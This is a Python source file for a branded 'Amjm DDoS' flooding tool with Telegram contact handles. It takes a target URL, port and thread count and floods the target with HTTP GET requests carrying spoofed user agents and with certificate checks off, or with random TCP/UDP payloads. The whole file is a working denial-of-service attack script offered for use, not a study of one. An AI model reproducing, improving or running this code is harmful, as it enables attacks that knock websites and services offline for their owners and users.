#Created By Amjm
import socket
import threading
import os
import random
from colorama import Fore
from fake_useragent import UserAgent
from ssl import CERT_NONE, SSLContext, create_default_context
from urllib.parse import urlparse
from certifi import where

os.system('cls || clear')
print(Fore.LIGHTRED_EX+
    """
 .d888888             oo               888888ba  888888ba           .d88888b  
d8'    88                              88    `8b 88    `8b          88.    "' 
88aaaaa88a 88d8b.d8b. dP 88d8b.d8b.    88     88 88     88 .d8888b. `Y88888b. 
88     88  88'`88'`88 88 88'`88'`88    88     88 88     88 88'  `88       `8b 
88     88  88  88  88 88 88  88  88    88    .8P 88    .8P 88.  .88 d8'   .8P 
88     88  dP  dP  dP 88 dP  dP  dP    8888888P  8888888P  `88888P'  Y88888P  
                      88                                                      
                      dP                                                      

  V- 1.0
  
"""
    )
   
print(Fore.RED, "╔════════════════════════════════════════════════════╗")
print(Fore.RED,"║"+Fore.RED, "                                                   ║")
print(Fore.RED, "║"+Fore.RED, "                                                   ║")
print(Fore.RED, "║"+Fore.RED, "                                                   ║")
print(Fore.RED, "║"+Fore.RED, "                                                   ║")
print(Fore.RED+" ║"+Fore.GREEN, " Group : https://t.me/+5koErIwywDg2ZDc0"+Fore.LIGHTRED_EX,"           ║")
print(Fore.LIGHTRED_EX, "                                                     ║")
print(Fore.RED+" ║"+Fore.LIGHTYELLOW_EX+"Telegram : @Amjm_DDoS"+Fore.RED, "                              ║")
print(Fore.RED,"╚════════════════════════════════════════════════════╝")
method = input(Fore.LIGHTYELLOW_EX+'[+] Method : ')
url = input(Fore.LIGHTGREEN_EX+'[+] Target : ')
port = int(input(Fore.LIGHTCYAN_EX+'[+] Port : '))
tr = int(input(Fore.LIGHTBLUE_EX+'[+] Threads : '))
rpc = int(input(Fore.LIGHTMAGENTA_EX+'[+] Rpc : '))

print(Fore.LIGHTRED_EX+"["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")

parsed_url = urlparse(url)
target = parsed_url.netloc
path = parsed_url.path

ssl = create_default_context(cafile=where())
ssl.check_hostname = False
ssl.verify_mode = CERT_NONE

if path == "":
    path = "/"


ua = UserAgent()

def httphead():
    return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()

def http():
    while True:
        try:
            if url.split('://')[0] == 'https':
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s = ssl.wrap_socket(s, server_hostname=target)
                s.connect((target,port))
            else:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((target,port))
            for _ in range(rpc):
                payl = httphead()
                s.send(payl)
        except:
            pass

def tcp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target,port))
            rn = random._urandom(1024)
            s.send(rn)
        except:
            pass

def udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target,port))
        rn = random._urandom(1024)
        s.send(rn)
    except:
        pass

if method == 'http':
    for _ in range(tr):
        t = threading.Thread(target=http)
        t.start()
elif method == 'tcp':
    for _ in range(tr):
        t = threading.Thread(target=tcp)
        t.start()
elif method == 'udp':
    for _ in range(tr):
        t = threading.Thread(target=udp)
        t.start
#ID Telegram : @Hj_Amir3
#Amjm